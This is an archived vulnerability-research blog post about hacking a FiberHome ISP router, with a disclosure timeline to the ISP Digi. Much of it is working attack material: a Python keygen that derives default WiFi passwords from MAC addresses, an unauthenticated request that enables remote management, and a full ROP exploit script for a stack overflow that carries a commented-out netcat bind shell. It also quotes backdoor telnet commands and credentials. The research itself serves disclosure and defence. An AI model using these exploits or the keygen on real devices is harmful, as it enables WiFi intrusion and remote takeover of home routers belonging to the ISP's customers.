---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-18_hacking-isp-cpe-equipment-fiberhome.md
original_filename: 2023-12-18_hacking-isp-cpe-equipment-fiberhome.md
title: 'Hacking ISP CPE equipment: FiberHome'
category: documents
detected_topics:
- command-injection
- sso
- xss
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- sso
- xss
- automation-abuse
- api-security
language: en
raw_sha256: ab6d861c6f84921655be64a418de6b521421157d73d7eb8fc6035762d3ea2ab5
text_sha256: f99468c0d3bffaf71036cd2b558558f6a9f69a94961b1839f4f2f5a9b71691a9
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: true
---

# Hacking ISP CPE equipment: FiberHome

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-18_hacking-isp-cpe-equipment-fiberhome.md
- Source Type: markdown
- Detected Topics: command-injection, sso, xss, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: True
- Raw SHA256: `ab6d861c6f84921655be64a418de6b521421157d73d7eb8fc6035762d3ea2ab5`
- Text SHA256: `f99468c0d3bffaf71036cd2b558558f6a9f69a94961b1839f4f2f5a9b71691a9`


## Content

---
title: "Hacking ISP CPE equipment: FiberHome"
page_title: "Gergely's hack blog – Hacking ISP CPE equipment: FiberHome"
url: "https://gergelykalman.com/hacking-isp-cpe-equipment-fiberhome.html"
final_url: "https://gergelykalman.com/hacking-isp-cpe-equipment-fiberhome.html"
authors: ["Gergely Kalman (@gergely_kalman)"]
programs: ["FiberHome"]
bugs: ["Cryptographic issues", "Weak credentials", "Missing authentication", "XSS", "Buffer Overflow", "Memory corruption"]
publication_date: "2023-12-18"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 609
---

# Hacking ISP CPE equipment: FiberHome

Posted on 2023-12-18 in [blog](https://gergelykalman.com/category/blog.html)

For those of you who are used to reading about my Apple research, this post is going to be a change of pace. This one is about `CPE` (Customer Premise Equipment) security, basically the routers your `ISP` gives you.

### Background

Last year I spent some time back in my home country Hungary, and I contracted `Digi`, a reputable local `ISP` to provide me with a fiber-optic connection for about $16 eur/month. 

I ended up receiving - and messing with - the `ISP`'s router, a `FiberHome AN5506-02-FG`:

![router](/images/fiberhome_router.jpg)

The service was great, especially for this price, so it's no wonder Digi is becoming increasingly popular. At this price-point though, I knew that the router must have been **cheap**.

Looking it up it turns out that it's a Chinese router, and while I do love my cheap Chinese stuff, I always expect the software to be an unmitigated disaster. Sadly, this device was no different.

### Weak passwords?

Since I don't like devices on my network that I can't administer, it didn't take long to do a little investigation. The unassuming box of the router came with stickers on it, indicating default passwords, the mac address and a serial number.

This is all standard stuff, but the password immediately stood out: it was `8 characters long` and contained only `lowercase hex` characters. It also started with 4 letters, followed by 4 numbers.

Now I'm not a combinatorics guy - I'm way too dumb to grasp that - but this looked pretty fishy. Instead of trying to do math (badly), I messaged a couple friends who might have the same device. Some did, and they confirmed what I feared: their passwords were also 8 hex digits.

This might still be a coincidence, but 3 random people having a password like this would be a pretty rare event. At this point I was sure that the default passwords are lowercase hex digits, which would mean that:

**I can crack any customer's default wifi password in about a day or two on my 2 year old GPU**.

Considering how in my experience 90% of people never bother to login to their router, let alone change their wifi password, this would mean that the overwhelming majority of customers are vulnerable.

To make matters worse, the password contained repeating sequences in the mac address as well as in the password. I thought for sure, that **this** had to be a coincidence. Bugs like this were dead for 10 years, 10 years ago. I haven't seen something like that in quite a while, and it was a rare sight even then. To cut my losses on the goose-chase I didn't follow up on this right away.

Still, the haul was already pretty good: a wifi password-guessing attack that would affect fiber customers at a major national ISP, requiring little GPU power.

Let's note by the way that the device might as well be offline at this point: we only looked at the router's stickers and sent a couple messages to our friends.

### First steps

After spending a bit of time banging my head against the wall with my macOS research I thought it might be refreshing to have some quick wins. I spent an afternoon trying to dig out the firmware for the device using various means but I was not successful.

Trivial blackbox command injections did not work, so I opted for getting the firmware. Not too long ago, you could download the firmware update from the vendor's website, but now it's an increasingly popular trend to try and hide these from the public.

This is a pretty stupid thing to do, as it won't really do much against motivated attackers, but it will hinder hobbyists and students who might not be too motivated or skilled to dig deep. Losing all the free work that these people would be willing to do for the CVE fame seems a bit foolish to me.

In any case, I won't waste time writing about the various methods you can get the firmware, Google has plenty of good results. I have a basic post half-written about these things but I doubt I could say anything that more qualified people have not said already.

The one thing I will mention though, is plain old Google sleuthing. There is a large amount of information to be found via the FCC database and googling for vulnerability writeups affecting the devices from the same vendor. Oftentimes the OEM just chucks the same vulnerable firmware on classes of devices without giving it much thought.

In fact, by using this method I ended up looking at a writeup in which a similar device was dumped with uart, using the factory-populated pins. Now this rarely happens, and you usually need to solder to the pins yourself, but I had no gear with me to do this. Thus I opted for seeing if my device shared the same curious feature.

After all, there's adventure to be found in rooting your `ISP`'s device at 1am on a Saturday.

Before we go further, note that messing with lasers can be very dangerous. Usually the short-haul, unamplified lasers that you get from your `ISP` are eye-safe, but not always. It's NEVER a good idea to mess with fiber-optics unprepared, so heed this warning:

> **SAFETY WARNING: THE LASER MIGHT BLIND YOU!**
> 
> Lasers can be invisible (infrared), and they can be powerful enough to blind you before you can blink.
> 
> Know what you are doing and use protective equipment, and never EVER look directly into a fiber optic cable or port, even when it seems to be inactive.
> 
> **DO NOT MESS WITH LASERS!**

With that warning out of they way, I unplugged the device, including the fiber cable(!), and took the cover off. The UART ports were easy to find and they were helpfully populated with pins, so I connected my UART cables and **put the cover back on** before I re-plugged the cables.

This process was a bit annoying as I had to do this a couple times to find which UART pin is which, but I managed to get a login prompt :)

> If you want to test this: make the Ethernet ports face you, the 4 pin connection is the UART, the rightmost one is the VCC, leave that one alone. The rest you can bruteforce or use a multimeter. Baud rate is 115200. Very standard stuff, but be careful!

### We're in!

My credentials for the web interface did not work and neither did admin/admin and other basic creds. I tried rebooting the router and observing the logs and I was a bit surprised to be presented with the option to press Ctrl-C to abort autoconfig. I did and I was greeted with a root shell.

The device has kernel `2.6.34.10`. It's around 12 years old at the time of writing this.

Here's some basic info about the device:
  
  
  Make: FiberHome AN5506-02-FG
  CPU: 32bit ARM
  Linux kernel: 2.6.34.10 (12 years old)
  Busybox: BusyBox v1.18.3 (2015-09-29 14:35:03 CST)
  ASLR: NO
  Stack canary: NO
  http daemon: Goahead webserver 2.5.0
  

I could use `curl` to install some tools I needed on the device. For this I could have rolled my own cross-compilation toolchain with something like `buildroot` (which is amazing), but instead I was lazy and just used pre-compiled tools from [this amazing repository](https://github.com/therealsaumil/static-arm-bins). Thanks for that :)

Before going further and screwing the device up, I quickly dumped the flash storage devices `/dev/mtdblock*` for safekeeping with `dd` and `netcat`. While this is not a completely foolproof solution - since the filesystem is mounted at the time of dumping - it is good enough for now. We can use this to get an idea about what is on the system, and since the binaries and configuration files are usually not written to, the most interesting files should be intact. Also it's advised to issue a `sync` command before dumping these, just in case.

To do an ideal job and get the proper firmware image, we could probably find a url pointing to it and fetch it on the device. I didn't do that, as the image seemed to be working just fine. Also it's worth noting that the device has limited flash storage and **the changes to the filesystem are persistent**. This is strange, usually the filesystem resets on reboot on these devices, but apparently that's not the case here.

Since exhausting the space on the `/` partition is not hard, it's advised to pay attention, as we might be able to brick the device by exhausting all the free space. I managed to do this since I used statically compiled binaries. Luckily I caught it quickly, but I would not try to reboot the device with 0% free space on `/`.

### Firmware shenanigans

Now that I **finally** have the device firmware, I could use `binwalk` to extract the various filesystems from the partitions. I ended up looking at `jffs2` filesystems, one for the `/`, some settings and some other binaries that are on a separate partition for some reason. Also most of these devices store a bunch of things twice, for fallback reasons, so pay attention to the differences if they exist between the clones.

The main web interface is a binary called `webs`, it lives on this separate partition. `strings` says that it's a `Goahead webserver 2.5.0`. This software has had some bad vulnerabilities in the past, and this version is ancient. Goahead was seemingly open source at one point and I even managed to get a copy of its' repo from github, but that has since been removed. If all else fails we can look for vulnerabilities in it, but right now it's more important for us to get a broader picture.

With the root shell I dumped `/etc/passwd` which surprisingly had a password hash in it: `root:W/xa5OyC3jjQU:0:0:root:/:/bin/sh`. I popped this into `JtR` and since 10s was not enough for it to crack it, I pasted it into Google. This is normally not advised, but since it was in `passwd` (and not `shadow`), and since it's very short, it must be some basic default.

Sure enough, I was immediately greeted with [Pierre Kim](https://pierrekim.github.io/)'s blogpost of a different device in the FiberHome family that he has pwned pretty thoroughly.

> Protip: If you work on devices like this (you can afford to leak the information), you can often find foreign-language writeups, github repos and other tasty treats by searching for unique-looking strings, error messages, usernames/passwords, etc... in Google.
> 
> I have found tons of confidential code sitting in public github repos this way, and looking at the original code is a lot easier than reversing.

After this much time investment it was a bummer to find that I'm a year late to this party, but at the same time it was also a relief. Since PK did most of my job for me, I could take it easy and save some time on the project, which is good as this vendor has no bounty program. So much so, that they seem to ignore security completely.

PK went as far as to state in his writeup that he applied Full Disclosure because he believed that **FiberHome deliberately backdoored the device**.

The `root password is "GEPON"` in case you were wondering, but I have not found an interface where this would work, so it's pretty useless.

Here is PK's original blogpost, I'll try to avoid the things he has already covered: <https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html>

To quickly sum it up: He has found 17 bugs in a different FiberHome device, most of them being very serious. This included auth bypasses, root RCE, hardcoded credentials (backdoors), stack overflows and a few others.

Check out his post for more info, here are some highlights:

  * He discovered a preauth infoleak: `http://192.168.1.1/info.asp`
  * He discovered a preauth RCE: `echo -en "\x1a\nhelp\nlist\nwho\nddd\ntshell" | nc 192.168.1.1 23`
  * He discovered a hidden telnet backdoor: `echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc 192.168.1.1 23 >/dev/null`
  * He found a backdoor pass for it: `irdsadmin / 6GFJdY4aAuUKJjdtSn7d`
  * He found that IPv6 is open to the internet, as they forgot to bring up the firewall for IPv6

I also found some of this independently, but he got there first so I'll give him full credit. A particularly eye-watering combination of vulns is the lack of firewall on IPv6 combined with the ability to enable telnet remotely.

By the way this is a real thing: My ISP (Digi) happens to assign working IPv6 addresses to these devices by default, like a good netizen. This unknowingly opens up every single customer's device to access by whoever who happens to know about the backdoor. This is not just Digi though, every single ISP's customers are vulnerable if they have a public IPv6 assigned to the router (and the ISP doesn't filter the traffic).

Knowing the general terrible state of affairs due to PK's research, let's go and see what else we can find. First things first: recon.

### Just how big is FiberHome?

The FiberHome brand apparently has most of its' customers in Asia, Digi is an exception (being a Romanian company). The OUI tables contain a range of MAC addresses for about `2.6 billion` FiberHome devices:
  
  
  $ cat /var/lib/ieee-data/oui.txt | grep -i fiberhome | grep hex | wc -l
  157
  

This is 157 OUI blocks of 3 byte addresses (`157 * 2**24 -> 2634022912`), adding up to ~2.6 billion possible devices. To put this number into perspective, D-Link has 84 blocks, ASUS has 86, TP-Link has 176, Intel has 680, Apple has 1053 and Cisco has 1135.

This squarely places FiberHome at the lower tier of the big player category with it's 157 allocated OUIs, the closest vendor I could think of was TP-Link (with 176 OUIs), and since TP-Link is **everywhere** (in the EU at least), **I consider FiberHome to be a major vendor**.

While the MAC allocations depend on the vendor, to me it's clear that FiberHome is a serious player in this field, and it should not be taking security as lightly as research suggests.

### Misc findings, notes, unimportant stuff

Before we get to the good stuff, here are some minor findings and informationals.

There's a `fingerprintable url` should you need to look for these devices for some reason: `http://192.168.1.1/help.html`

I found a memory corruption independently of PK, but he got to it first:
  
  
  wget --no-check-certificate -O- --header "Cookie: loginName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://192.168.1.1/tr069/tr069.asp
  

If you want to mess with this, you can comment out the watchdog config line that looks for the webs service and restart the watchdog service. If you don't do this (and webs crashes) you will encounter problems. If memory serves well the entire device will reboot, so that's pretty inconvenient.

Here are some hidden preauth menus:
  
  
  http://192.168.1.1/devregist/register.asp
  http://192.168.1.1/devregist/register_anhui.asp
  http://192.168.1.1/devregist/register_cu.asp
  http://192.168.1.1/devregist/register_jiangsu.asp
  http://192.168.1.1/devregist/register_lncu.asp
  http://192.168.1.1/devregist/register_pwd.asp
  

There's some fairly hilarious (useless) XSS protection in webs.
  
  
  (((pcVar5 = strstri(pcVar5,"<script>"), pcVar5 != (char *)0x0 ||
  (pcVar5 = strstri((char *)param_1[0x31],"%3cscript%3e"), pcVar5 != (char *)0x0)) ||
  ((pcVar5 = strstri((char *)param_1[0x31],"<script%3e"), pcVar5 != (char *)0x0 ||
  (pcVar5 = strstri((char *)param_1[0x31],"%3cscript>"), pcVar5 != (char *)0x0)))))) {
  

The `webs` binary has symbols compiled in, so that's an easy win.

It should come as no surprise that `ASLR is hopelessly broken`. This is less of a finding and more of a given, considering the 32bit CPU architecture and the 12 year old Linux kernel. More on this later. Also there is `no stack canary`.

Okay, now we can get to the good stuff.

### Finding #1: Keygen for the default WiFi password

To start off with a banger, I wanted to validate whether my hunch about the WiFi passwords were true. After spending a few hours on trying to find the password generation routines, a friend told me that I should just look for XOR.

By looking for that I found myself looking at the function `rstWifiCfg()` in libwifi.so, but I found no XORs anywhere. As it turns out my friend was right though. Well, almost.

It wasn't XOR. It was **NOT**.

**The default WiFi (WPA2 PSK) password came from inverting the bits in the 2-5th bytes of the MAC address.**

This means that if an attacker knows the MAC address - which is shouted into the ether as that's how WiFi works - **the attacker can compute the default password in their head**...

**Too crazy for you? Okay.**
  
  
  FiberHome password decoder
  
  To compute the WiFi password take the MAC address, like 00:11:22:33:44:55
  Get the middle 4 pieces without the colons: 11223344
  
  Use the following table to compute the password
  
  0: f  8: 7
  1: e  9: 6
  2: d  a: 5
  3: c  b: 4
  4: b  c: 3
  5: a  d: 2
  6: 9  e: 1
  7: 8  f: 0
  
  In our example the password is eeddccbb.
  

**Not very sophisticated, is it?**

Now, using the MAC as a seed was incredibly stupid, as it was never meant to be secret. So much so, that in fact it is meant to be broadcasted to all the peers on the network. As a result of using the MAC, anyone in the vicinity can compute the password trivially.

If you do not have access to the MAC address of the router, don't fret. Either you can steal another mac from the LAN, since they are sequentially assigned to the device's interfaces. This means that +5/-5 of the given mac you have will be the WiFi one.

The router also happily leaks its' MAC addresses on the web interface at the `/info.asp` url. This might even work from the WAN side of the connection (from a browser) via something like DNS rebinding, but my websec is way too rusty to figure that out. My DMs are open though :)

**Summary**

It is shocking to me that the vendor was this negligent when picking the algorithm, and I'm astounded at how nobody at the numerous ISPs (with presumably millions of deployed devices) has failed to notice this.

Anyone with a brain can see that a given batch of devices tend to have eerily similar passwords, so I guess a lot of people put two and two together, but they managed to stay silent. At least publicly. I looked for and did not find any indication about this being public information, until now.

Here is the keygen for the default wifi passwords of these routers, just in case:
  
  
  import sys
  
  mac_raw = sys.argv[1]
  mac = []
  for hexchar in mac_raw.split(":")[1:5]:
  mac.append(int(hexchar, 16))
  
  print("Password=***REDACTED***
  for i in mac:
  tmp = (~i) & 0xff
  print("{:02x}".format(tmp), end="")
  print()
  

**Limitations of this attack**

Since this attack predicts default passwords, it is easily mitigated.

According to my stupid estimates - driving around town for a bit - I saw that 90% of people didn't even bother to change the `SSID` of their router, likely keeping the default password as well. With that in mind, I'd say that 80-90% of fiber customers on this router are affected, which is pretty bad.

**Scope of affected people**

In total, using my pretty limited sampling I'd say that 30% of Digi customers are affected. If we combine this with more official data from [statista](https://www.statista.com/statistics/1184771/hungary-market-share-of-service-providers-based-on-fixed-broadband-internet-subscriptions/), we get a 21.8% market share of Digi in the residential market, meaning that ~7.2% of Hungarian households have this device. This would mean that there are around 600 000 affected people.

Again, my methodology was extremely basic and likely incorrect.

For the global impact I could not make measurements, but there are 4-5 ISPs in Asia with much larger user bases that rely on the same device.

**In conclusion**

Not only was my initial suspicion about hex digits correct, as it turns out my completely unhinged, tinfoil-hat paranoid hunch about the password's letters being correlated to the MAC address were indeed spot on.

I did not see that coming and in fact I wouldn't have, had I not talked to this friend. It's invaluable to talk to other smart people in the field as individually we tend to miss things, particularly if we have decades of predispositions.

Let this be a lesson to anyone out there:

**Your wildest, most insane, "there is no fucking way" bugs might be alive and well in millions of devices, waiting to be discovered.**

**Mitigations**

> To mitigate, the end user must change all the default WiFi passwords.

### Finding #2: enable remote management without authentication

Now that we have LAN access, it's about time we investigated the router's services.

I found a couple endpoints, one of the more interesting one seemed to be `http://192.168.1.1/rmnt.asp`. This endpoint did not require authentication and it allows me to enable remote management.

Hilariously it also requires a captcha, but that is not validated by the backend, only by JS in the browser. The solution to the captcha can be found in a `<td>` for your viewing pleasure, but since it's not validated by the backend **at all** it doesn't really matter what value you set it to.

**This is how you enable remote management from the LAN:**
  
  
  wget -S -q --post-data="jiaoyanma=axal6&recontrol_check=1" --referer="http://192.168.1.1/rmnt.asp" -O - http://192.168.1.1/goform/setRemoteControl_3BB
  

`jiaoyanma` is the var name, the value doesn't matter. `recontrol_check` 0 means disable, 1 means enable.

The only reason this is not more catastrophic is the fact that the referrer header is checked and I haven't found an easy way to do this from a 3rd party website. I also suck at web security, so if you have a solution for this, let me know as being able to trigger this from a 3rd party site would quickly change the severity from _problematic_ to **game over**.

Digi was smart enough to filter tcp 80 and 443 coming in from the internet side (at least on IPv4), so this is less of an issue from the WAN side.

The router admin interface was seemingly available from IPv6, but I did not test that. Once I reported this to Digi they made appropriate changes upstream, so I suspect that my assumption was correct.

### Finding #3: XSS in DHCP client name

A DHCP client name shows up in the admin panel, unfiltered. This is a quite minor, but hilarious issue in part due to the ridiculous XSS filter attempts in `webs`.

### Finding #4: Stack Buffer Overflow in cookieToNameValue in webs

There's also a buffer overflow in the `cookieToNameValue()` function. The buffer has size 520.

Call trace to this function
  
  
  #0  0x00012bb4 in getLoginUserFromCookie ()
  #1  0x00012fe0 in web_access_control ()
  #2  0x0008c250 in websDefaultHandler ()
  #3  0x0008ff28 in websUrlHandlerRequest ()
  #4  0x0009b508 in websGetInput ()
  #5  0x0009b698 in websReadEvent ()
  #6  0x0009bb88 in websSocketEvent ()
  #7  0x00092c14 in socketProcess ()
  #8  0x0009d1a4 in main ()
  

Memory is corrupted here:
  
  
  memset(acStack556,uVar6,0x202);
  *len = uVar6;
  strtok(param_1,";");
  >>> strcpy(acStack556,param_1);
  

ASLR is 11 bits of entropy, but some sections are always static, including `text`. The `text` section is at an address though that has 0x00 sequences in it, making it useless.

Instead of that, I opted to use a ROP chain using gadgets from the shared libraries that also happen to be mapped to static addresses. These addresses didn't have 0x00 bytes in them to cause problems :)

While I never wrote a ROP chain in my life - thinking that it was rocket-science \- it turned out to be quite a chill and fun time. Sure, large libraries mapped to static addresses helped a lot.

The ROP chain works by getting the stack base from the `$sp` register and adding to it so that it points into our large request buffer. This way we can use parts of our HTTP request as an argument to `system()`, to keep it easy.

I didn't bother to make this abort gracefully, but if you want to prevent crashes from showing up in the logs, you can always just fork off into a subshell, terminate the webs process and restart it :)

I also have a ROP chain to disable the telnet iptables rule, in case RCE is not your thing.
  
  
  #!/usr/bin/python3
  
  import sys
  import socket
  import struct
  
  IP = "192.168.1.1"
  PORT = 80
  
  def tobin(addr):
  # don't set lsb as that'd turn arm into thumb mode
  return struct.pack("<I", addr & 0xfffffffe)
  
  
  # NOTE: offset is 542 (size == 542)
  cookielen = 556
  
  ### assemble sh cmd
  cmdlen = 70
  cmd = b'id #'
  #cmd = b'nc -l -p 12345 -e sh&killall -9 webs&./webs -L 3 -M 1 -S 100 -m all&#'
  if len(cmd) <= cmdlen:
  cmd += b'B'*(cmdlen-len(cmd))
  else:
  print("cmd longer than {}!".format(cmdlen))
  exit(1)
  
  forbidden_chars = b''#\n\x00; '
  good = True
  for i in forbidden_chars:
  if i in cmd:
  print("Bad char in cmd: {}".format(i))
  good=False
  if not good:
  exit(1)
  ### end
  
  #### addresses from the binary
  # NOTE: webs_base is too low, so we can't use it due to \x00 bytes!
  uclibc_base = 0x40ea6000
  addr_exit = uclibc_base + 0xc91c
  addr_puts = uclibc_base + 0x2b0e8
  addr_deadbfff = 0xdeadbffe
  addr_system = uclibc_base + 0x5588c
  
  libpthread_base = 0x40010000
  addr_system2 = libpthread_base + 0x9088
  
  libnomci_base = 0x405e4000
  libcrypto_base = 0x40058000
  
  libgl3_advance_base = 0x402b0000
  iptables_string = libgl3_advance_base + 0x27530
  
  
  libuclibc_base = 0x40000000
  libgcc_base = 0x40e93000
  libcm_base = 0x404e6000
  
  ### gadgets
  inst1 = libnomci_base  + 0x0010d8c4 # pop {r0} ; bx lr
  inst2 = libnomci_base  + 0x0010d8f8 # pop {r0, lr} ; bx lr
  inst3 = libuclibc_base  + 0x00023718 # pop {r0, r1, r2, r3, r4, r5, r7, lr} ; bx lr
  inst4 = libcrypto_base  + 0x001443c8 # add r0, sp, #0xc ; mov lr, pc ; bx r6
  inst5 = libnomci_base  + 0x0002c958 # pop {lr} ; bx lr
  inst6 = libnomci_base  + 0x00020e60 # mov r0, #0 ; bx lr
  inst7 = libuclibc_base  + 0x00038080 # mov r0, #0 ; pop {lr} ; bx lr
  inst8 = libcrypto_base  + 0x001429a4 # add r1, sp, #8 ; mov lr, pc ; bx r7
  inst9 = libgcc_base  + 0x00004588 # mov r0, r1 ; pop {r4, lr} ; bx lr
  inst10 = libcm_base  + 0x00023ef0 # add sp, sp, #0x84 ; pop {r4, r5, lr} ; bx lr
  inst11 = libuclibc_base + 0x0001f25c # mov lr, pc ; bx r5 ; pop {r4, r5, r6, lr} ; bx lr
  inst12 = libuclibc_base + 0x0001f260 # bx r5 ; pop {r4, r5, r6, lr} ; bx lr
  inst13 = libcrypto_base + 0x0004ed98 # add sp, sp, #0x14 ; pop {lr} ; bx lr
  inst14 = libcrypto_base + 0x000cc950 # add sp, sp, #0x24 ; pop {lr} ; bx lr
  inst15 = libuclibc_base + 0x00042370 # mov r3, r0 ; mov r0, sp ; mov lr, pc ; bx r3 ; add sp, sp, #0x1c ; pop {lr} ; bx lr
  inst16 = libcrypto_base + 0x0004b310 # bx r3 ; pop {r4, lr} ; bx lr
  
  ret = inst10
  ret_addr = tobin(ret)
  
  # using an add r{1,2,3} here is fine as r0 r1 r3 are all zero
  ret2 = inst8
  ret2_addr = tobin(ret2)
  ret2_param = iptables_string
  ret2_param_addr = tobin(ret2_param)
  
  ret3 = inst14
  ret3_addr = tobin(ret3)
  ret3_param = addr_deadbfff
  ret3_param_addr = tobin(ret3_param)
  
  ret4 = addr_puts
  ret4_addr = tobin(ret4)
  ret4_param = addr_puts
  ret4_param_addr = tobin(ret4_param)
  
  buf =  b'A' * 70
  buf += b'B' * 50
  buf += ret2_addr
  buf += ret3_addr
  buf += b'P' * 424
  buf += ret_addr
  buf += b'X' * 4
  buf += ret2_addr
  buf += b'Z' * 8
  
  if b'\x00' in buf:
  print("ERROR: NULL byte in buf!")
  print(buf)
  exit(-1)
  
  # NOTE: loginname= replaced with XXXXXX so webs doesn't try to unpack the cookie
  request = b'GET /tr069/tr069.asp HTTP/1.1\r\nHost: 192.168.1.1\r\nCookie: ' + buf + b'\r\nConnection: close\r\n\r\n'
  
  # print(request)
  
  s = socket.create_connection((IP, PORT))
  s.send(request)
  
  resp = bytearray()
  while True:
  ret = s.recv(1024)
  print(ret)
  if len(ret) == 0:
  break
  resp += ret
  print(resp.decode("utf-8", errors="ignore"))
  

NOTE: This is old code and I no longer have the device so this might or might not work out of the box. I am not too concerned about it, as the vulnerabilities are still unpatched, I don't mind if script kiddies can't take this to run amok.

### Next research topics (things I did not have time for)

If you wish to look into the device yourself, please do! There are many bugs to be found, I was barely scratching the surface. Here are some of the things I have not had the time for, in no particular order:

Another crash in `webs`:

> Another interesting crash occurs if I replace loginname= in the Cookie with a string without "=", like AAAAAAAAAAAA... webs won't try to unpack the cookie and will call strcpy many times and trash registers and memory.
> 
> **I haven't investigated this further, but potentially this is another free 0day!**

There's a large number of unsafe memory copies reachable via the web admin:

  * strcpy()

  * macaddr_v6_filterCfg
  * macaddr_filterCfg
  * pppoe_cfg
  * DHCP_filterCfg
  * strcat():

  * setLanDHCP in param dhcpSecDns
  * if I set these to "AAAAA...", I don't get a stack overflow but dhcpd fails to start, and it's impossible to remove the "A"s :)

I suspect there are many, many more, the code is a mess. Also there's appendstring, bcopy, etc...

Potential heap overflow in multipart handling:

> There's a possible heap overflow in multipart handling, boundary is copied with no bounds checking.

Another fun thing is that the device authenticates you using your IP, and there are no cookies or parameters sent, your session is retrieved using your IP address...

The Referer header is checked using `strstr()` which IMO is the harbinger of doom in router security. There's a very good chance that this could be used to bypass the Referrer check from a 3rd party website, which would also mean that this can be exploited form outside the network!

> NOTE: If you have one of these devices and you're willing to collab, I'd be grateful if you helped me test this theory. My DMs are open on Twitter (X).

In conclusion: there are heaps of bugs to be found still. I did all this audit by hand by the way, so no tooling or fuzzing or anything resembling actual thought was employed. These are just the rough notes of me playing around with the device for shits and giggles for a couple days.

## The vendor's reponse

I notified FiberHome of these vulnerabilities, but that fell on deaf ears. They seem to be notorious for three things: Having cheap products, having horrific security, and not engaging with security researchers at all.

Considering the fact that they have about 2 billion mac addresses allocated for all of their products it is not too far-fetched to think that these vulnerabilities might affects millions if not tens of millions of people.

Since I was preoccupied with the impact on my home country and my local ISP I did report this to Digi as well. I'd thought that would be useful since - in my estimations - ~600k households could be affected only in Hungary.

FiberHome's no response was quite alarming, and Digi was a bit hard to reach. There is no bug bounty page, security page, security.txt or anything of the sort. The only place I could send such things to seemed to be the GDPR email address and I had a hunch that they could direct me to either the security team or the internal legal team at least.

As a sidenote, I did email CERT Hungary before all of this and I got no response from them in a couple of days, in fact I have not received anything from them ever since.

For good measure I also sent a copy to the Hungarian NKI (National Cybersecurity Institute), but I got nothing back from them either.

As far as Digi is concerned, the CISO of Digi, dr. Zsuffa András has responded the next day, and he couldn't have been nicer. I sent him the encrypted reports and they have fixed everything they could. They have internally notified the vendor as well, but I was told that the vendor was not cooperative, even when they asked. This is just utterly ridiculous since the vendor could address most of these issues with an update.

**All in all kudos to Digi, dr. Zsuffa, the digi devs and the people who have forwarded my email to the right person. The way they handled this case was exemplary, and I wish more companies would respond to reports like they did.**

Unfortunately some things remain unresolved. One of the major issues remaining is the password generation weakness. Digi communicated that they will be unable to fix this issue, since the passwords are printed on the bottom of the devices.

**If you are a Digi customer who has a FiberHome router, please change all the default WiFi passwords!**

If you're not one of these people, change your WiFi passwords anyway, because you have no way of knowing whether your ISP or router vendor has done a good job.

### Timeline

  * 2022.08.14 - reported to CERT Hungary (no response)
  * 2022.08.16 - reported to the Hungarian Cyber Defense Institute (NKI) (no response)
  * 2022.08.16 - reported to Digi GDPR email
  * 2022.08.18 - response from dr. Zsuffa (Digi CISO)
  * 2022.09.28 - I request an update
  * 2022.09.30 - Digi fixed all the bugs they could

I commend Digi for the quick response and their cooperation on this matter!

### Disclaimer

> NOTE: At the time of publication my notes were ~1.5 years old, and I did not have access to the device anymore. Because of that I couldn't include as much info as I would have liked, sorry about that.
> 
> The reason I am so late with this post is because I had reports to write to Apple that actually awarded me bounties, so those were clearly higher priority. Also it's useful as this way there was ample time for Digi to patch/replace their stuff.

[router](https://gergelykalman.com/tag/router.html) [0day](https://gergelykalman.com/tag/0day.html) [fiberhome](https://gergelykalman.com/tag/fiberhome.html) [embedded](https://gergelykalman.com/tag/embedded.html) [iot](https://gergelykalman.com/tag/iot.html)
